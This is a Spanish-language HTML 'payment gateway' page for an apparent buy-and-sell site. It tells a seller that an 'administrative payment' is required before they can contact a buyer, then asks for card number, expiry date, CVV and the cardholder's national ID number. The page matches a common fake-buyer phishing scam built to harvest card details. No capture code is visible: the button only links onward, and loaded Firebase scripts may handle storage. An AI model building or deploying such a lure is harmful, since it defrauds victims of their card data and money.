<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="/files/src/icons/icono.ico" type="image/x-icon" />
    <!-- Bootstrap -->
    <link rel="stylesheet" href="/files/css/bootstrap-grid.min.css">
    <link rel="stylesheet" href="/files/css/bootstrap-reboot.min.css">
    <link rel="stylesheet" href="/files/css/bootstrap-utilities.min.css">
    <link rel="stylesheet" href="/files/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css" />
    <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
    <!-- css -->
    <link rel="stylesheet" href="/files/css/styles.css">
    <title>Passarela de pago</title>
</head>
<body>
    <div>
        <section id="header_tienda">
            <div id="contenedor_header" class="row align-items-center px-3">
                <div class="col-2">
                    <img src="/files/src/images/logo.png" alt="" width="200px"/>
                </div>
                <div class="col-10">
                    <div class="row d-flex justify-content-end">
                        <div class="col-auto">
                            <div class="d-flex align-items-center">
                                <span class="btn fw-bold"><a class="text-warning" href="/files/pages/comprador.html"><i class="bi bi-bootstrap-reboot fs-5 p-1"></i>Volver</a></span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
        <section id="pasarela">
            <div class="container">
                <div class="row justify-content-center">
                    <div class="col-sm-12 col-md-10 col-lg-8">
                        <div class="card p-3">
                            <div class="cinta pt-1 my-3"></div>
                            <div class="row justify-content-around">
                                <div class="col-auto">
                                    <div class="contenedor-aviso shadow">
                                        <div class="text-center ">
                                            <h4 class="fw-bold text-center">IMPORTANTE</h4>
                                            <hr>
                                            <div class="mt-5">
                                                <p class="fs-5">Para poder contactar con el comprador deberas hacer un pago administrativo</p>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <div class="col-sm-12 col-md-6 col-lg-6">
                                    <div class="card p-3">
                                        <h4 class="text-center mb-3">Ingrese sus datos de su tarjeta</h4>
                                        <div class="row justify-content-center">
                                            <div class="col-sm-12 col-md-10 col-lg-12">
                                                <label for="">N° de Tarjeta</label>
                                                <input class="form-control mb-3" type="number" placeholder="1111 2222 3333 4444">
                                            </div>
                                            <div class="col-sm-12 col-md-6 col-lg-4">
                                                <label for="">Mes</label>
                                                <input class="form-control mb-3" type="number" placeholder="01">
                                            </div>
                                            <div class="col-sm-12 col-md-6 col-lg-4">
                                                <label for="">Año</label>
                                                <input class="form-control mb-3" type="number" placeholder="22">
                                            </div>
                                            <div class="col-sm-12 col-md-6 col-lg-4">
                                                <label for="">CVV</label>
                                                <input class="form-control mb-3" type="number" placeholder="232">
                                            </div>
                                            <div class="col-sm-12 col-md-6 col-lg-12">
                                                <label for="">DNI del propietario de tarjeta</label>
                                                <input class="form-control mb-3" type="number" placeholder="1234567">
                                            </div>
                                            <div class="col-sm-12 col-md-6 col-lg-12">
                                                <div class="text-center">
                                                    <a href="/files/pages/vendedor.html"><span class="btn btn-estilo rounded-pill">Realizar Pago</span></a>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </div>
    <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-firestore.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.9.1/firebase-storage.js"></script>
    <script src="/files/js/bootstrap.bundle.min.js"></script>
    <script src="/files/js/bootstrap.min.js"></script>
    <script src="/files/js/script.js"></script>
    <script src="/files/js/firebase.js"></script>
</body>
</html>
